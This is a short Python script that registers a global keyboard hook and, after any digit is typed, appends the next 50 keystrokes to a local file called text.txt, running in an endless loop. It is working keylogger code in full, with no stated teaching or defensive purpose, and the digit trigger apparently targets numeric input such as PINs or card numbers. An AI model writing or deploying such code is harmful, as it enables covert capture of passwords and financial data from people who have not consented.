import keyboard

nChars = 0


def getKey(event):
    global nChars

    name = event.name

    if (len(name) > 1):
        name = f"[-{name}-]"

    if (name.isdigit() and nChars == 0):
        nChars = 50

    if (nChars == 0):
        return

    with open("text.txt", "a") as f:
        f.write(name)

        nChars -= 1

        if (nChars == 0):
            f.write('\n')


keyboard.on_release(callback=getKey)

while True:
    pass
